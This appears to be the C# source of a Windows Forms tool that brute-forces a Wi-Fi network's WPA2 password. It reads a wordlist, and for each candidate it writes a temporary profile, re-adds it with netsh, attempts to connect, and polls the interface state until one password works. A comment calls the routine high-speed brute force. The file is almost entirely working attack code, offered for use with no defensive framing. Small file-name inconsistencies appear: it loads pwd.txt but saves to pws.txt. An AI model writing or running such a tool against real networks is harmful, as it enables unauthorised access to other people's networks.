using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace ZxXpFly_WiFI
{
    public partial class passwordName : Form
    {
        private List<string> pwdList = new List<string>();

        public passwordName()
        {
            InitializeComponent();
            LoadPwdList();      // 启动就加载根目录 pws.txt
        }

        /* ---------- 加载根目录 pws.txt ---------- */
        private void LoadPwdList()
        {
            var path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "pwd.txt");
            pwdList = File.Exists(path)
                ? File.ReadAllLines(path).Select(l => l.Trim()).Where(l => l != "").ToList()
                : new List<string> { "12345678", "88888888" }; // 默认
        }

        /* ---------- 主按钮 ---------- */
        private void ConnectWifi_Click(object sender, EventArgs e)
        {
            string ssid = textBox1.Text.Trim();
            if (ssid == "") { MessageBox.Show("请输入 Wi-Fi 名称"); return; }

            string hit = Brute(ssid);
            if (hit != null)
            {
                password.Text = hit;
                /* 置顶保存 */
                pwdList.Remove(hit);
                pwdList.Insert(0, hit);
                File.WriteAllLines(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "pws.txt"),
                                   pwdList.Select(p => p + ","));
            }
            else
            {
                MessageBox.Show("所有密码均无法连接");
            }
        }

        /* ---------- 高速爆破 ---------- */
        private string Brute(string targetSsid)
        {
            foreach (var pwd in pwdList)
            {
                label3.Text = pwd;
                /* 1. 生成一次性 XML */
                string xml = BuildProfileXml(targetSsid, pwd);
                /* 2. 临时文件 */
                string tmp = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.xml");
                File.WriteAllText(tmp, xml, new UTF8Encoding(false));

                /* 3. 强制覆盖 profile */
                RunNetsh($"wlan delete profile name=\"{targetSsid}\"");
                string addRet = RunNetsh($"wlan add profile filename=\"{tmp}\" user=all");
                File.Delete(tmp);
                if (!addRet.Contains("已将配置文件")) continue;

                /* 4. 触发连接 */
                RunNetsh($"wlan connect name=\"{targetSsid}\"");

                /* 5. 事件通知等待（最多 1.5 s）*/
                if (WaitConnected(targetSsid, 1500))
                    return pwd;
            }
            return null;
        }

        /* ---------- 等待连接成功 ---------- */
        private bool WaitConnected(string targetSsid, int timeoutMs)
        {
            var sw = Stopwatch.StartNew();
            do
            {
                string txt = RunNetsh("wlan show interfaces");
                var lines = txt.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                string state = "";
                string name = "";
                foreach (var line in lines)
                {
                    var parts = line.Split(':'); if (parts.Length < 2) continue;
                    var key = parts[0].Trim();
                    var val = parts[1].Trim();
                    if (key == "状态" || key.ToLower() == "state")
                        state = val;
                    if (key == "SSID" || key == "名称")
                        name = val;
                }
                if (state == "已连接" && name == targetSsid)
                    return true;
                Thread.Sleep(100);
            } while (sw.ElapsedMilliseconds < timeoutMs);
            return false;
        }

        /* ---------- 同步执行 netsh ---------- */
        private string RunNetsh(string args)
        {
            var psi = new ProcessStartInfo("netsh", args)
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8
            };
            var sb = new StringBuilder();
            using (var p = Process.Start(psi))
            {
                p.OutputDataReceived += (s, e) => sb.AppendLine(e.Data);
                p.ErrorDataReceived += (s, e) => sb.AppendLine(e.Data);
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();
                p.WaitForExit();
            }
            return sb.ToString();
        }

        /* ---------- 构造 WPA2-PSK 临时 Profile ---------- */
        private string BuildProfileXml(string ssid, string key)
        {
            return
            "<?xml version=\"1.0\"?>" +
            "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">" +
            $"<name>{SecurityElement.Escape(ssid)}</name>" +
            $"<SSIDConfig><SSID><name>{SecurityElement.Escape(ssid)}</name></SSID></SSIDConfig>" +
            "<connectionType>ESS</connectionType>" +
            "<connectionMode>auto</connectionMode>" +
            "<MSM><security>" +
            "<authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption>" +
            $"<sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{SecurityElement.Escape(key)}</keyMaterial></sharedKey>" +
            "</security></MSM>" +
            "</WLANProfile>";
        }

        /* ---------- 调试 ---------- */
        private void btnDebug_Click(object sender, EventArgs e)
        {
            File.WriteAllText("interfaces.log", RunNetsh("wlan show interfaces"));
            MessageBox.Show("已导出 interfaces.log");
        }
    }
}